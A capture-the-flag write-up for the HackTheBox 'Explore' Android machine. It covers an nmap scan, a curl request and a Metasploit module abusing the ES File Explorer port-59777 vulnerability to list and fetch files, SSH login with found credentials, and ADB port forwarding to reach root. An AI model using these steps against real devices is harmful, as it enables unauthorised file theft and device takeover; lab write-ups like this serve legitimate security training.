# HackTheBox-Explore

## NMAP

```bash
nmap -p- -sC -sV --min-rate 5000 10.10.10.247 -vv
PORT      STATE    SERVICE REASON         VERSION          
2222/tcp  open     ssh     syn-ack ttl 63 (protocol 2.0)
| fingerprint-strings:                                                        
|   NULL:                          
|_    SSH-2.0-SSH Server - Banana Studio                     
| ssh-hostkey:                
|   2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqK2WZkEVE0CPTPpWoyDKZkHVrmffyDgcNNVK3PkamKs3M8tyqeFBivz4o8i9Ai8UlrVZ8mztI3qb+cHCdLMDpaO0ghf/50qYVGH4gU5vuVN
0tbBJAR67ot4U+7WCcdh4sZHX5NNatyE36wpKj9t7n2XpEmIYda4CEIeUOy2Mm3Es+GD0AAUl8xG4uMYd2rdrJrrO1p15PO97/1ebsTH6SgFz3qjZvSirpom62WmmMbfRvJtNFiNJRydDpJvag2u
rk16GM9a0buF4h1JCGwMHxpSY05aKQLo8shdb9SxJRa9lMu3g2zgiDAmBCoKjsiPnuyWW+8G7Vz7X6nJC87KpL                                                              
5555/tcp  filtered freeciv no-response                                
42135/tcp open     http    syn-ack ttl 63 ES File Explorer Name Response httpd
|_http-server-header: ES Name Response Server              
|_http-title: Site doesn't have a title (text/html).
43891/tcp open     unknown syn-ack ttl 63              
| fingerprint-strings:                        
|   GenericLines:                                            
|     HTTP/1.0 400 Bad Request                                                
|     Date: Sat, 26 Jun 2021 22:27:36 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Sat, 26 Jun 2021 22:27:36 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Sat, 26 Jun 2021 22:27:42 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 22:27:59 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 22:27:42 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 22:27:59 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|   TLSSessionReq:      
|     HTTP/1.0 400 Bad Request                                            
|     Date: Sat, 26 Jun 2021 22:28:01 GMT
|     Content-Length: 71           
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close       
|     Invalid request line:                                               
|     ??random1random2random3random4
|   TerminalServerCookie:                                                 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 22:28:01 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close                                                   
|     Invalid request line: 
|_    Cookie: mstshash=nmap                                               
59777/tcp open     http    syn-ack ttl 63 Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).

```

From the nmap scan the only port that interests me was the port 42135

## PORT 42135 (HTTP)

<img src="https://imgur.com/S6uumOa.png"/>

But there was nothing on this port , so I searched a bit since it was using `ES File explorer Name Response httpd` and that made me curious as I daily used that file explorer on my android device. On searching I found some interesting results

<img src="https://i.imgur.com/BntJvN7.png"/>

https://www.safe.security/assets/img/research-paper/pdf/es-file-explorer-vulnerability.pdf

## PORT 59777 (HTTP)

This version of ES File explorer was vulnerable that would allow us to read and download files being on the same network as  ES file browser creates an HTTP service bound to port 59777 at runtime, which provides some commands for accessing data in android device executing them however the service does not check this request, the available commands for us are  

<img src="https://imgur.com/vOxVXMG.png"/>

So I used metasploit module to exploit this

<img src="https://imgur.com/4fZr3Cr.png"/>

<img src="https://i.imgur.com/GS9WzcB.png"/>

And this work so let's use the command to list apps installed on this device

<img src="https://i.imgur.com/gJN5Ski.png"/>

We can try to list all apps including the system apps to see which version of android it's using and from the results it's android 9

<img src="https://i.imgur.com/1CYINVa.png"/>

Now the issue with metasploit module is that we can only list files but not in folders , like if I want to look what's in `/sdcard` I can't so looked for articles on how to exploit it manually

https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566

<img src="https://imgur.com/T4zCn3M.png"/>

```bash
curl --header "Content-Type: application/json" --request POST --data "{\"command\":\"listFiles\"}" http://10.10.10.247:59777/sdcard/
```

<img src="https://i.imgur.com/h5f4buC.png"/>

Perfect , we can now some how try to navigate to folders and we can see the `user.txt` as well , we can't grab the text file by using curl but metasploit module did have command `GETFILE`

<img src="https://i.imgur.com/5H6VfLZ.png"/>

<img src="https://i.imgur.com/8tLMVFL.png"/>

We got the user flag , now we just need to figuire out how we can get into the android device.

On going through different directories , I visisted `DCIM` folder which is a folder for storing images taken from android device's camera or any other photos you download from app basically all images are stored here , so in this folder we can see an image `creds.jpg` which is interesting

<img src="https://imgur.com/H1Ard0N.png"/>

So to get this image we'll do the same thing we did for user flag

<img src="https://imgur.com/Xd49dIh.png"/>

<img src="https://i.imgur.com/lTOVkxi.png"/>

We got the creds as SSH server is listening on port 2222 we can connect to it

## PORT 2222 (SSH)

<img src="https://i.imgur.com/wvIeCur.png"/>

Now remeber that we saw port 5555 which was filtered , googling that tells us that port listens for `ADB` (Android Debug Bridge) which allows us debug apps or acces hidden features or mayeb to pop up unix shell so maybe we can use this to get root. You can read more about adb from here  https://www.xda-developers.com/what-is-adb/

<img src="https://i.imgur.com/2ZhpvrG.png"/>

In order to connect it , we need to first do port forwarding for port 5555

## PORT 5555 (ADB)

<img src="https://i.imgur.com/0xSPXlk.png"/>

Now we just need to use `adb` to connect with that port , if you don't have adb installed you can install by following this https://www.xda-developers.com/install-adb-windows-macos-linux/

On connecting we can see changes in user groups

<img src="https://i.imgur.com/9ZWko48.png"/>

So let's just do `su`

<img src="https://i.imgur.com/2KiSYfo.png"/>

We are root , for the root flag , I used `find` command as I didn't know where to look for `root.txt`

<img src="https://imgur.com/zujrgZS.png"/>

With this we solved this machine !!!